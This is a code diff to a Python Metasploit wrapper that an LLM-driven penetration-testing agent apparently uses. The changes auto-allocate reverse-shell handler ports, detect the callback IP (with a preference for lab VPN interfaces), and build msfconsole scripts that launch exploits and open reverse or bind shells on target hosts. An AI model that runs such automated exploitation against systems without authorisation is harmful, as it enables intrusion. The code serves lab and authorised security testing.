@@ -6,6 +6,7 @@ Fallback: runs msfconsole subprocess when RPC is unavailable.
 """
 
 import asyncio
+import itertools
 import logging
 import os
 import re
@@ -22,6 +23,14 @@ logger = logging.getLogger(__name__)
 EXPLOIT_TIMEOUT = 90   # seconds for RPC
 MSF_CONSOLE_TIMEOUT = 120  # seconds for msfconsole subprocess (slower to start)
 _CMD_TIMEOUT = 30  # seconds for session command execution
+
+# ── LPORT auto-allocator ──────────────────────────────────────────────────────
+# When multiple exploit agents run concurrently, they must not share LPORT 4444.
+# This counter cycles through a range of ports so each msfconsole invocation
+# gets its own handler port, preventing "Handler failed to bind" errors.
+_LPORT_POOL_START = 4400
+_LPORT_POOL_END = 4500
+_lport_counter = itertools.cycle(range(_LPORT_POOL_START, _LPORT_POOL_END))
 
 # Patterns that indicate a session was opened in msfconsole output
 _SESSION_PATTERNS = [
@@ -147,14 +156,24 @@ class MetasploitTool(BaseTool):
                 p["target_port"] = p.pop(alias)
             else:
                 p.pop(alias, None)
-        # LHOST / lhost → options["LHOST"]
+        # LHOST / lhost → options["LHOST"] (top-level only)
         for alias in ("lhost", "LHOST"):
             if alias in p:
-                p.setdefault("options", {})[alias.upper()] = p.pop(alias)
-        # LPORT / lport → options["LPORT"]
+                p.setdefault("options", {})["LHOST"] = p.pop(alias)
+        # LPORT / lport → options["LPORT"] (top-level only)
         for alias in ("lport", "LPORT"):
             if alias in p:
-                p.setdefault("options", {})[alias.upper()] = p.pop(alias)
+                p.setdefault("options", {})["LPORT"] = p.pop(alias)
+        # Coerce options to dict — LLM may pass "" or null
+        if "options" in p and not isinstance(p["options"], dict):
+            p["options"] = {}
+        # Normalize option keys inside the options dict to UPPERCASE
+        # so that 'lhost', 'lport', 'LHOST', 'LPORT' all collapse to one key.
+        if "options" in p and isinstance(p["options"], dict):
+            normalized_opts: dict = {}
+            for k, v in p["options"].items():
+                normalized_opts[k.upper()] = v
+            p["options"] = normalized_opts
         return p
 
     async def execute(self, params: dict) -> dict:
@@ -401,10 +420,20 @@ class MetasploitTool(BaseTool):
         import shutil
         from core.platform_utils import IS_WINDOWS, IS_MACOS
 
+        # 1. Config override (MSF_CONSOLE_PATH env var or settings)
+        try:
+            from config import settings
+            if settings.msf.msfconsole_path:
+                return settings.msf.msfconsole_path
+        except Exception:
+            pass
+
+        # 2. PATH lookup (covers Kali, Parrot, BlackArch, macOS Homebrew, etc.)
         path_hit = shutil.which("msfconsole")
         if path_hit:
             return path_hit
 
+        # 3. Common fixed installation paths per platform
         candidates: list[str] = []
         if IS_WINDOWS:
             candidates = [
@@ -420,18 +449,22 @@ class MetasploitTool(BaseTool):
                 "/opt/homebrew/bin/msfconsole",
             ]
         else:
+            # Linux: Kali, Parrot, BlackArch, Ubuntu (snap), Arch (AUR), Docker
             candidates = [
-                "/usr/bin/msfconsole",
-                "/usr/local/bin/msfconsole",
-                "/opt/metasploit-framework/bin/msfconsole",
-                "/snap/metasploit-framework/current/bin/msfconsole",
+                "/usr/bin/msfconsole",               # Kali, Parrot, Debian packages
+                "/usr/local/bin/msfconsole",          # manual install
+                "/opt/metasploit-framework/bin/msfconsole",   # official installer
+                "/snap/metasploit-framework/current/bin/msfconsole",  # Ubuntu snap
+                "/usr/share/metasploit-framework/msfconsole",         # some Arch packages
+                os.path.expanduser("~/.rbenv/shims/msfconsole"),       # rbenv install
+                os.path.expanduser("~/.rvm/gems/default/bin/msfconsole"),  # rvm install
             ]
 
         for c in candidates:
             if os.path.isfile(c):
                 return c
 
-        return "msfconsole"  # fallback — let the OS raise FileNotFoundError
+        return "msfconsole"  # final fallback — let the OS raise FileNotFoundError
 
     async def _run_msfconsole(self, rc_commands: list[str], timeout: int = MSF_CONSOLE_TIMEOUT) -> str:
         """Write an .rc script and run msfconsole -q -r <file>. Returns stdout."""
@@ -474,9 +507,11 @@ class MetasploitTool(BaseTool):
         """Return the local IP address that the target can reach back to.
 
         Priority:
-        1. MSF_LHOST_OVERRIDE env var (manual override for complex NAT/WSL setups)
-        2. Local interface on the same subnet as target_ip  (most accurate)
-        3. Socket routing trick fallback
+        1. MSF_LHOST_OVERRIDE (manual override for NAT/WSL/VPN setups)
+        2. VPN/tunnel interface on HTB/THM/exam networks (tun0, tap0, ppp0)
+        3. Interface on the same subnet as target_ip
+        4. Socket routing trick (kernel routing table query)
+        5. Any non-loopback IPv4 address
         """
         if settings.msf.lhost_override:
             return settings.msf.lhost_override
@@ -487,94 +522,107 @@ class MetasploitTool(BaseTool):
         import subprocess
         from core.platform_utils import IS_WINDOWS
 
-        # ── Strategy 1: find interface on the same subnet as target ──────
-        try:
-            target = ipaddress.ip_address(target_ip)
-
-            def _parse_ip_prefix(text: str) -> list[tuple[str, int]]:
-                """Extract (ip, prefix_len) pairs from OS-specific output."""
-                pairs = []
-                # `ip addr` format: inet 192.168.56.1/24
-                for m in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", text):
-                    pairs.append((m.group(1), int(m.group(2))))
-                # `ifconfig` format: inet 192.168.56.1 netmask 0xffffff00 / 255.255.255.0
-                for m in re.finditer(
-                    r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(\S+)", text
-                ):
-                    ip_str, mask_str = m.group(1), m.group(2)
+        def _parse_ip_prefix(text: str) -> list[tuple[str, str, int]]:
+            """Extract (interface, ip, prefix_len) triples from ip addr / ifconfig."""
+            triples = []
+            current_iface = ""
+            for line in text.splitlines():
+                # ip addr line: "2: eth0: <...>"
+                m_iface = re.match(r"^\d+:\s+(\S+):", line)
+                if m_iface:
+                    current_iface = m_iface.group(1).rstrip(":")
+                # inet 192.168.1.5/24 or inet 192.168.1.5 netmask 255.255.255.0
+                m_inet = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", line)
+                if m_inet:
+                    triples.append((current_iface, m_inet.group(1), int(m_inet.group(2))))
+                    continue
+                m_inet2 = re.search(
+                    r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(\S+)", line
+                )
+                if m_inet2:
+                    ip_str, mask_str = m_inet2.group(1), m_inet2.group(2)
                     try:
                         if mask_str.startswith("0x"):
-                            mask_int = int(mask_str, 16)
-                            prefix = bin(mask_int).count("1")
+                            prefix = bin(int(mask_str, 16)).count("1")
                         else:
-                            prefix = sum(
-                                bin(int(o)).count("1") for o in mask_str.split(".")
-                            )
-                        pairs.append((ip_str, prefix))
+                            prefix = sum(bin(int(o)).count("1") for o in mask_str.split("."))
+                        triples.append((current_iface, ip_str, prefix))
                     except Exception:
                         pass
-                return pairs
+            return triples
 
-            def _parse_windows_netsh(text: str) -> list[tuple[str, int]]:
-                """Parse 'netsh interface ip show address' output."""
-                pairs = []
-                for m in re.finditer(
-                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+).*?Subnet Prefix:.*?/(\d+)",
-                    text, re.DOTALL,
-                ):
-                    pairs.append((m.group(1), int(m.group(2))))
-                # Fallback: parse "IP Address" + "Subnet Mask" lines
-                for m in re.finditer(
-                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)\s+Subnet Mask:\s+(\d+\.\d+\.\d+\.\d+)",
-                    text,
-                ):
-                    ip_str, mask_str = m.group(1), m.group(2)
-                    try:
-                        prefix = sum(bin(int(o)).count("1") for o in mask_str.split("."))
-                        pairs.append((ip_str, prefix))
-                    except Exception:
-                        pass
-                return pairs
-
+        # ── Strategy 1: scan all interfaces ──────────────────────────────
+        all_ifaces: list[tuple[str, str, int]] = []  # (iface, ip, prefix)
+        try:
             if IS_WINDOWS:
-                cmds = [["netsh", "interface", "ip", "show", "address"], ["ipconfig"]]
+                from core.platform_utils import IS_WINDOWS  # noqa: F811
+                result = subprocess.run(
+                    ["netsh", "interface", "ip", "show", "address"],
+                    capture_output=True, text=True, timeout=5,
+                )
+                # Simpler parse for Windows
+                for m in re.finditer(
+                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)", result.stdout
+                ):
+                    all_ifaces.append(("unknown", m.group(1), 24))
             else:
-                cmds = [["ip", "-4", "addr", "show"], ["ifconfig"]]
-
-            for cmd in cmds:
-                try:
-                    result = subprocess.run(
-                        cmd, capture_output=True, text=True, timeout=5
-                    )
-                    if result.returncode != 0:
+                for cmd in (["ip", "-4", "addr", "show"], ["ifconfig", "-a"]):
+                    try:
+                        result = subprocess.run(
+                            cmd, capture_output=True, text=True, timeout=5
+                        )
+                        if result.returncode == 0 and result.stdout.strip():
+                            all_ifaces = _parse_ip_prefix(result.stdout)
+                            break
+                    except FileNotFoundError:
                         continue
-                    if IS_WINDOWS:
-                        parsed = _parse_windows_netsh(result.stdout)
-                    else:
-                        parsed = _parse_ip_prefix(result.stdout)
-                    for ip, prefix in parsed:
-                        if ip.startswith("127."):
-                            continue
-                        try:
-                            net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
-                            if target in net:
-                                return ip
-                        except ValueError:
-                            continue
-                except FileNotFoundError:
-                    continue
         except Exception:
             pass
 
-        # ── Strategy 2: socket routing trick ──────────────────────────────
+        if all_ifaces:
+            try:
+                target = ipaddress.ip_address(target_ip)
+            except ValueError:
+                target = None
+
+            # ── Prefer VPN/tunnel interfaces (HTB/THM/exam networks) ──────
+            _VPN_IFACE_PREFIXES = ("tun", "tap", "ppp", "vpn", "wg")
+            for iface, ip, prefix in all_ifaces:
+                if ip.startswith("127."):
+                    continue
+                if any(iface.lower().startswith(p) for p in _VPN_IFACE_PREFIXES):
+                    return ip
+
+            # ── Same-subnet interface ────────────────────────────────────
+            if target:
+                for iface, ip, prefix in all_ifaces:
+                    if ip.startswith("127."):
+                        continue
+                    try:
+                        net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
+                        if target in net:
+                            return ip
+                    except ValueError:
+                        continue
+
+        # ── Strategy 2: kernel routing table (most reliable single call) ──
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1)
             s.connect((target_ip, 80))
             ip = s.getsockname()[0]
             s.close()
-            return ip
+            if ip and not ip.startswith("127."):
+                return ip
         except Exception:
-            return ""
+            pass
+
+        # ── Strategy 3: any non-loopback address ──────────────────────────
+        for _, ip, _ in all_ifaces:
+            if not ip.startswith("127."):
+                return ip
+
+        return ""
 
     # Modules that trigger a backdoor/shell on the target and then inject a
     # payload command into that shell.  In classic MSF (< ~2022) this was done
@@ -672,13 +720,18 @@ class MetasploitTool(BaseTool):
         start = time.monotonic()
         logger.info("Running exploit via msfconsole: %s → %s:%s", module_path, target_ip, target_port)
 
-        if is_native and not payload:
-            # Native-shell modules: try without explicit payload first, then
-            # iterate through candidate payloads until one works.
+        if is_native:
+            # Native-shell modules ALWAYS go through the native exploit path,
+            # even if the LLM specified an explicit payload. This ensures:
+            # 1. Stale backdoor port cleanup (e.g. port 6200 for vsftpd)
+            # 2. Proper bind-payload candidate iteration
+            # 3. Fetch payload fallback on non-conflicting port
+            # If the LLM specified a payload, try it first as the initial candidate.
             output = await self._try_native_shell_exploit(
                 module_path, target_ip, target_port, extra_opts,
                 post_commands=post_commands,
                 timeout=exploit_timeout,
+                preferred_payload=payload or None,
             )
         else:
             output = await self._try_exploit_with_payload(
@@ -799,6 +852,7 @@ class MetasploitTool(BaseTool):
         extra_opts: dict,
         post_commands: list[str] | None = None,
         timeout: int = MSF_CONSOLE_TIMEOUT,
+        preferred_payload: str | None = None,
     ) -> str:
         """Try native-shell exploit with bind payload candidates.
 
@@ -826,7 +880,12 @@ class MetasploitTool(BaseTool):
                 await asyncio.sleep(2)
 
         # ── Pass 1: try bind payloads (preferred — no LHOST, no port conflict) ─
-        for candidate in self._INTERACT_CANDIDATES:
+        # If caller specified a preferred payload, prepend it to the candidate list
+        # (deduplicating so we don't try it twice if it's already in the list).
+        candidates = list(self._INTERACT_CANDIDATES)
+        if preferred_payload and preferred_payload not in candidates:
+            candidates.insert(0, preferred_payload)
+        for candidate in candidates:
             logger.info(
                 "[MSF] Trying %s with payload %s → %s:%s",
                 module_path, candidate, target_ip, target_port,
@@ -1020,14 +1079,25 @@ class MetasploitTool(BaseTool):
         """
         lhost = self._get_lhost(target_ip)
 
+        # Auto-allocate LPORT to avoid conflicts when multiple exploit agents
+        # run concurrently.  Only used for reverse payloads (LHOST needed).
+        # Bind payloads don't start a local handler so LPORT doesn't matter.
+        is_reverse = payload and any(
+            kw in payload.lower() for kw in ("reverse", "meterpreter")
+        )
+        auto_lport: int | None = None
+        if is_reverse and "LPORT" not in extra_opts:
+            auto_lport = next(_lport_counter)
+            logger.debug("Auto-allocated LPORT=%d for %s", auto_lport, module_path)
+
         commands = [
             "unsetg PAYLOAD",
             "unsetg LHOST",
             f"use {module_path}",
-            # 'set --clear' fully removes both user-set AND default values,
-            # ensuring the module uses its own compatible default payload.
-            "set --clear PAYLOAD",
-            "set --clear LHOST",
+            # 'unset PAYLOAD' clears both user-set and global PAYLOAD values.
+            # Prefer 'unset' over 'set --clear' for broader MSF version compatibility.
+            "unset PAYLOAD",
+            "unset LHOST",
             f"set RHOSTS {target_ip}",
             f"set RPORT {target_port}",
         ]
@@ -1036,13 +1106,20 @@ class MetasploitTool(BaseTool):
             logger.debug("Setting explicit payload: %s", payload)
             commands.append(f"set PAYLOAD {payload}")
 
-        # Always set LHOST: required if the module default (or explicitly set)
-        # payload is a reverse shell or meterpreter.
+        # Always set LHOST for reverse/meterpreter payloads.
         if lhost:
             logger.debug("Setting LHOST=%s for %s", lhost, target_ip)
             commands.append(f"set LHOST {lhost}")
 
+        if auto_lport is not None:
+            commands.append(f"set LPORT {auto_lport}")
+
+        # Add extra options — skip LHOST/LPORT keys we already set above
+        # to avoid duplicate RC commands.
+        _skip_keys = {"LHOST", "LPORT"}
         for key, val in extra_opts.items():
+            if key.upper() in _skip_keys:
+                continue
             commands.append(f"set {key} {val}")
 
         # Always use run -z (background) — never interactive `run` which causes
